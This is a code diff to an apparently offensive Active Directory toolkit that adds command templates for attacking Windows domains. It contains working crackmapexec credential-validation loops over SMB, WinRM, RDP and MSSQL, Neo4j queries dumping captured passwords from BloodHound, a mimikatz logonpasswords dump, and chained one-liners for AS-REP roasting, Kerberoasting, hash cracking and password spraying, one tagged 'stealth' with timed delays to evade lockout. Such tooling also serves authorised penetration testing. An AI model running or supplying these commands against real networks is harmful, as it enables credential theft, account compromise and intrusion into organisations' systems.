@@ -2125,6 +2125,51 @@ SPRAY_TECHNIQUES: Dict[str, SprayTechniqueInfo] = {
 }
 
 
+# =============================================================================
+# ALL-TARGETS CREDENTIAL VALIDATION (Multi-protocol loops)
+# =============================================================================
+# Templates for testing credentials across all discovered hosts
+# Uses bash loops (<=20 IPs) or file-based input (>20 IPs)
+
+ALL_TARGETS_PROTOCOLS: Dict[str, Dict[str, str]] = {
+    "smb": {
+        "port": "445",
+        "description": "Shows Pwn3d! for local admin access",
+        "loop_template": '''for IP in {ips}; do
+    crackmapexec smb $IP -u {user_file} -p '{password}' -d {domain} --continue-on-success
+done''',
+        "file_template": "crackmapexec smb {targets_file} -u {user_file} -p '{password}' -d {domain} --continue-on-success",
+    },
+    "winrm": {
+        "port": "5985",
+        "description": "PS Remoting / Evil-WinRM targets",
+        "loop_template": '''for IP in {ips}; do
+    crackmapexec winrm $IP -u '{username}' -p '{password}' -d {domain}
+done''',
+        "file_template": "crackmapexec winrm {targets_file} -u '{username}' -p '{password}' -d {domain}",
+    },
+    "rdp": {
+        "port": "3389",
+        "description": "Remote Desktop access check",
+        "loop_template": '''for IP in {ips}; do
+    crackmapexec rdp $IP -u '{username}' -p '{password}' -d {domain}
+done''',
+        "file_template": "crackmapexec rdp {targets_file} -u '{username}' -p '{password}' -d {domain}",
+    },
+    "mssql": {
+        "port": "1433",
+        "description": "Database server access",
+        "loop_template": '''for IP in {ips}; do
+    crackmapexec mssql $IP -u '{username}' -p '{password}' -d {domain}
+done''',
+        "file_template": "crackmapexec mssql {targets_file} -u '{username}' -p '{password}' -d {domain}",
+    },
+}
+
+# Threshold for switching from inline IPs to file-based input
+ALL_TARGETS_IP_THRESHOLD = 20
+
+
 # Spray scenarios for contextual recommendations
 SPRAY_SCENARIOS: List[Dict[str, Any]] = [
     {
@@ -2205,8 +2250,8 @@ USER_ENUM_COMMANDS: Dict[str, Dict[str, Dict[str, str]]] = {
             "description": "CME user enumeration (authenticated)",
         },
         "bloodhound_export": {
-            "cmd": "echo 'MATCH (u:User) RETURN u.name' | cypher-shell -u neo4j -p '<NEO4J_PASS>' --format plain | tail -n +2 | cut -d'@' -f1 > users.txt",
-            "description": "Export users from BloodHound Neo4j",
+            "cmd": "echo \"MATCH (u:User) WHERE u.name IS NOT NULL AND NOT u.name STARTS WITH 'NT AUTHORITY' RETURN u.samaccountname\" | cypher-shell -u neo4j -p '<NEO4J_PASS>' --format plain | tail -n +2 | sed 's/\"//g' | grep -v '^$' > users.txt",
+            "description": "Export users from BloodHound Neo4j (clean output)",
         },
         "rpcclient": {
             "cmd": "rpcclient -U '<USERNAME>%<PASSWORD>' <DC_IP> -c 'enumdomusers' | grep -oP '\\[.*?\\]' | tr -d '[]' | cut -d' ' -f1 > users.txt",
@@ -2218,6 +2263,109 @@ USER_ENUM_COMMANDS: Dict[str, Dict[str, Dict[str, str]]] = {
         },
     },
 }
+
+
+# =============================================================================
+# PASSWORD LIST GENERATION COMMANDS (for generating password lists)
+# =============================================================================
+
+PASSWORD_LIST_COMMANDS: Dict[str, Dict[str, Dict[str, str]]] = {
+    "linux": {
+        "bloodhound_passwords": {
+            "cmd": "echo \"MATCH (u:User) WHERE u.pwned = true UNWIND u.pwned_cred_values AS cred RETURN cred\" | cypher-shell -u neo4j -p '<NEO4J_PASS>' --format plain | tail -n +2 | sed 's/\"//g' | grep -v '^$' | sort -u > passwords.txt",
+            "description": "Export pwned passwords from BloodHound Neo4j",
+        },
+        "bloodhound_user_pass": {
+            "cmd": "echo \"MATCH (u:User) WHERE u.pwned = true AND 'password' IN u.pwned_cred_types WITH u, [i IN range(0, size(u.pwned_cred_types)-1) WHERE u.pwned_cred_types[i] = 'password' | u.pwned_cred_values[i]][0] AS pass WHERE pass IS NOT NULL RETURN u.samaccountname + ':' + pass\" | cypher-shell -u neo4j -p '<NEO4J_PASS>' --format plain | tail -n +2 | sed 's/\"//g' > user_pass.txt",
+            "description": "Export user:password pairs from Neo4j",
+        },
+        "hashcat_potfile": {
+            "cmd": "cat ~/.hashcat/hashcat.potfile | cut -d':' -f2 > passwords.txt",
+            "description": "Extract cracked passwords from hashcat potfile",
+        },
+        "john_potfile": {
+            "cmd": "cat ~/.john/john.pot | cut -d':' -f2 > passwords.txt",
+            "description": "Extract cracked passwords from john potfile",
+        },
+        "cewl_wordlist": {
+            "cmd": "cewl -d 2 -m 5 -w passwords.txt <TARGET_URL>",
+            "description": "Generate wordlist from target website",
+        },
+        "mutation_rules": {
+            "cmd": "hashcat --stdout -r /usr/share/hashcat/rules/best64.rule passwords.txt > mutated_passwords.txt",
+            "description": "Apply mutation rules to existing password list",
+        },
+    },
+    "windows": {
+        "mimikatz_extract": {
+            "cmd": "mimikatz.exe \"sekurlsa::logonpasswords\" exit | findstr /i \"Password :\" > passwords.txt",
+            "description": "Extract passwords from mimikatz output",
+        },
+    },
+}
+
+
+# Password list generation scenario recommendations
+PASSWORD_LIST_SCENARIOS: List[Dict[str, str]] = [
+    {
+        "scenario": "Have pwned users in BloodHound",
+        "method": "bloodhound_passwords",
+        "reason": "Direct extraction of captured credentials from Neo4j",
+    },
+    {
+        "scenario": "Need user:password pairs for spray",
+        "method": "bloodhound_user_pass",
+        "reason": "Export in format ready for credential stuffing",
+    },
+    {
+        "scenario": "After cracking NTLM/Kerberos hashes",
+        "method": "hashcat_potfile",
+        "reason": "Extract successfully cracked passwords",
+    },
+    {
+        "scenario": "Web application target",
+        "method": "cewl_wordlist",
+        "reason": "Organization-specific words from website content",
+    },
+    {
+        "scenario": "Need password variations",
+        "method": "mutation_rules",
+        "reason": "Expand list with common patterns (l33t, seasons, years)",
+    },
+]
+
+
+# =============================================================================
+# SPRAY ONE-LINERS (complete chained attack workflows)
+# =============================================================================
+
+SPRAY_ONELINERS: List[Dict[str, str]] = [
+    {
+        "name": "Full Neo4j Spray (Stealth)",
+        "description": "Export non-pwned users + passwords from Neo4j, spray with kerbrute",
+        "cmd": 'echo "MATCH (u:User) WHERE (u.pwned IS NULL OR u.pwned = false) AND u.enabled = true AND u.name IS NOT NULL AND NOT u.name STARTS WITH \'NT AUTHORITY\' RETURN u.samaccountname" | cypher-shell -u neo4j -p \'<NEO4J_PASS>\' --format plain | tail -n +2 | sed \'s/"//g\' | grep -v \'^$\' > targets.txt && echo "MATCH (u:User) WHERE u.pwned = true UNWIND u.pwned_cred_values AS cred RETURN cred" | cypher-shell -u neo4j -p \'<NEO4J_PASS>\' --format plain | tail -n +2 | sed \'s/"//g\' | grep -v \'^$\' | sort -u > spray_passwords.txt && for p in $(cat spray_passwords.txt); do kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> targets.txt "$p"; sleep 1800; done',
+    },
+    {
+        "name": "Neo4j Spray + Admin Check (CME)",
+        "description": "Export from Neo4j, spray with CME to identify admin access (Pwn3d!)",
+        "cmd": 'echo "MATCH (u:User) WHERE (u.pwned IS NULL OR u.pwned = false) AND u.enabled = true RETURN u.samaccountname" | cypher-shell -u neo4j -p \'<NEO4J_PASS>\' --format plain | tail -n +2 | sed \'s/"//g\' | grep -v \'^$\' > targets.txt && echo "MATCH (u:User) WHERE u.pwned = true UNWIND u.pwned_cred_values AS cred RETURN cred" | cypher-shell -u neo4j -p \'<NEO4J_PASS>\' --format plain | tail -n +2 | sed \'s/"//g\' | sort -u > spray_passwords.txt && crackmapexec smb <DC_IP> -u targets.txt -p spray_passwords.txt -d <DOMAIN> --continue-on-success --no-bruteforce',
+    },
+    {
+        "name": "AS-REP Roast → Crack → Spray",
+        "description": "Roast AS-REP users, crack hashes, spray cracked passwords",
+        "cmd": "impacket-GetNPUsers -dc-ip <DC_IP> -request -outputfile asrep.txt <DOMAIN>/ && hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --show | cut -d':' -f2 >> spray_passwords.txt && crackmapexec smb <DC_IP> -u users.txt -p spray_passwords.txt -d <DOMAIN> --continue-on-success --no-bruteforce",
+    },
+    {
+        "name": "Kerberoast → Crack → Spray",
+        "description": "Kerberoast SPNs, crack TGS hashes, spray cracked passwords",
+        "cmd": "impacket-GetUserSPNs -dc-ip <DC_IP> -request -outputfile kerberoast.txt '<DOMAIN>/<USERNAME>:<PASSWORD>' && hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --show | cut -d':' -f2 >> spray_passwords.txt && crackmapexec smb <DC_IP> -u users.txt -p spray_passwords.txt -d <DOMAIN> --continue-on-success --no-bruteforce",
+    },
+    {
+        "name": "CeWL → Mutate → Spray",
+        "description": "Generate wordlist from website, apply mutations, spray",
+        "cmd": "cewl -d 2 -m 5 -w cewl_words.txt <TARGET_URL> && hashcat --stdout -r /usr/share/hashcat/rules/best64.rule cewl_words.txt | sort -u > spray_passwords.txt && kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> users.txt spray_passwords.txt",
+    },
+]
 
 
 def get_spray_technique(method: str) -> Optional[SprayTechniqueInfo]:
@@ -2238,6 +2386,21 @@ def get_spray_scenarios() -> List[Dict[str, Any]]:
 def get_user_enum_commands(platform: str = "linux") -> Dict[str, Dict[str, str]]:
     """Get user enumeration commands for a platform."""
     return USER_ENUM_COMMANDS.get(platform, {})
+
+
+def get_password_list_commands(platform: str = "linux") -> Dict[str, Dict[str, str]]:
+    """Get password list generation commands for a platform."""
+    return PASSWORD_LIST_COMMANDS.get(platform, {})
+
+
+def get_password_list_scenarios() -> List[Dict[str, str]]:
+    """Get password list generation scenario recommendations."""
+    return PASSWORD_LIST_SCENARIOS
+
+
+def get_spray_oneliners() -> List[Dict[str, str]]:
+    """Get spray one-liner commands for complete attack workflows."""
+    return SPRAY_ONELINERS
 
 
 def get_post_exploit_commands(privilege_level: str, category: Optional[str] = None) -> List[tuple]:
